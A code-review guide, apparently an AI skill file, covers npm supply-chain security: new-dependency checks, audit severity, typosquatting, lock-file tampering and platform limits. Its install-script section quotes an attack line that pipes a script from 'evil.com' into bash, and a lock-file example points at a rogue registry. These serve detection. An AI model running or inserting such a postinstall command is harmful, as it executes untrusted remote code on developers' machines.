---
name: dependency-security
description: Supply chain security — npm audit, dependency hygiene, typosquatting, transitive risks, and Vercel/Supabase-specific dependency concerns.
---

# Dependency Security Review

## Quick Reference — New Dependency Checklist

When a PR adds a new dependency, check:

| Check | Threshold | Where to Look |
|-------|-----------|---------------|
| Weekly downloads | Flag if <1,000 | npmjs.com package page |
| Last publish | Flag if >12 months ago | npmjs.com "Last publish" |
| Maintainer count | Note if 1 (bus factor risk) | npmjs.com "Collaborators" |
| Open issues/PRs | Flag if >100 unaddressed | GitHub repo |
| License | Must be MIT, Apache-2.0, BSD, or ISC | package.json `license` field |
| Bundle size | Note if >50KB gzipped | bundlephobia.com |
| npm audit | No high/critical advisories | `npm audit` output |
| Install scripts | Flag any `preinstall`/`postinstall` scripts | package.json `scripts` |
| TypeScript types | Prefer packages with built-in types | `@types/*` or bundled `.d.ts` |

---

## npm Audit Interpretation

### Severity Levels
| Severity | Action Required | Example |
|----------|----------------|---------|
| **Critical** | Fix before merge. No exceptions. | RCE, auth bypass, data exfiltration |
| **High** | Fix before merge if in production deps. Can defer if devDependency only. | XSS, SQL injection, prototype pollution |
| **Moderate** | Fix within 1 week. Note in PR. | DoS, information disclosure |
| **Low** | Fix during next maintenance cycle. | Theoretical attacks, edge cases |

### Common Noise to Ignore
- Vulnerabilities in devDependencies that never run in production
- Advisories for features you don't use (e.g., XML parsing vuln when you only use JSON)
- Transitive dependencies 5+ levels deep with no actual attack path

### Transitive Dependency Risks
Your code may be safe, but your dependency's dependency's dependency isn't:
```
your-app → safe-library → old-util → vulnerable-package
```
**Detection:** `npm audit` shows the full chain. **Fix:** Update safe-library (which should update old-util), or use `overrides` in package.json to force a specific version:
```json
{
  "overrides": {
    "vulnerable-package": ">=2.0.0"
  }
}
```

---

## Supply Chain Attack Vectors

### Typosquatting
Packages with names similar to popular ones:
- `lodash` vs `1odash` or `lodahs`
- `react` vs `reactt`
- `express` vs `expres`

**Detection:** Unusual package name in PR diff. Check exact name on npmjs.com.

### Ownership Transfer Attacks
Attacker gains access to a popular package (via social engineering, abandoned maintainer, compromised npm token) and publishes malicious version.

**Detection:**
- Package recently changed ownership (check GitHub/npm history)
- Sudden version bump with minimal changelog
- New `postinstall` script in a package that didn't have one

### Lock File Manipulation
Attacker modifies `package-lock.json` to point to a different package registry or version:
```json
// ❌ Suspicious: resolved URL pointing to non-npm registry
"resolved": "https://evil-registry.com/lodash-4.17.21.tgz"

// ✅ Normal: standard npm registry
"resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
```
**Review:** On any PR that modifies `package-lock.json`, verify `resolved` URLs point to the official npm registry.

### Install Script Attacks
```json
// ❌ Flag for review — runs arbitrary code on npm install
{
  "scripts": {
    "preinstall": "node setup.js",
    "postinstall": "curl https://evil.com/steal.sh | bash"
  }
}
```
Most legitimate packages don't need install scripts. Flag any package that has `preinstall`, `install`, or `postinstall` scripts for manual review.

---

## Dependency Hygiene

### Unused Dependencies
```bash
# Check for unused dependencies
npx depcheck
```
Flag any dependency in `package.json` that isn't imported anywhere in the codebase. Unused deps:
- Increase install time
- Increase attack surface
- Increase bundle size (if not tree-shaken)

### Version Pinning Strategy
| Strategy | Pros | Cons | Use When |
|----------|------|------|----------|
| Exact: `4.17.21` | Deterministic, no surprises | Miss security patches | CI/CD, production deploys |
| Range: `^4.17.21` | Auto-gets patches | Could introduce breaking changes | Development, when Dependabot is configured |
| Latest: `*` | Always current | Completely unpredictable | **Never in production** |

**Our approach:** Use caret ranges (`^`) in `package.json` with a committed `package-lock.json`. Dependabot/Renovate for automated PRs on updates.

---

## Supabase and Vercel Specific

### Supabase Client Library Compatibility
| Package | Status | Use Instead |
|---------|--------|-------------|
| `@supabase/auth-helpers-nextjs` | ❌ Deprecated | `@supabase/ssr` |
| `@supabase/supabase-js` v1 | ❌ EOL | `@supabase/supabase-js` v2 |
| `@supabase/realtime-js` (standalone) | ⚠️ Usually not needed | Included in `supabase-js` |

### Vercel Serverless Limits
- Function bundle size: 50MB uncompressed (250MB with layers)
- Cold start time increases with bundle size
- **Flag:** Dependencies that pull in native modules (sharp, canvas, bcrypt) — these may not work in Vercel's serverless environment. Use `@vercel/og` for images, `bcryptjs` (pure JS) instead of `bcrypt`.

### Edge Function Limitations
- No native Node.js modules (no `fs`, `path`, `crypto` — use Web Crypto API)
- Limited to 1MB bundle size on Supabase Edge Functions
- No `node_modules` with native bindings

---

## The "Should We Add This Dependency?" Decision Tree

```
Is there a native/built-in alternative?
  → Yes → Use the native API (fetch, crypto, URL, etc.)
  → No ↓

Is this a one-time use or ongoing?
  → One-time → Copy the relevant code (with attribution) instead of adding dep
  → Ongoing ↓

Does it pass the New Dependency Checklist (above)?
  → No → Find an alternative or write it yourself
  → Yes ↓

Is the bundle size impact acceptable?
  → No → Find a lighter alternative (date-fns over moment, preact over react-icons)
  → Yes → Add it. Document WHY in the PR description.
```

## Sources
- Socket.dev supply chain security research
- GitHub Advisory Database
- npm security documentation
- Vercel serverless documentation
- Supabase Edge Functions documentation

## Changelog
- 2026-03-21: Initial skill — dependency security for code review
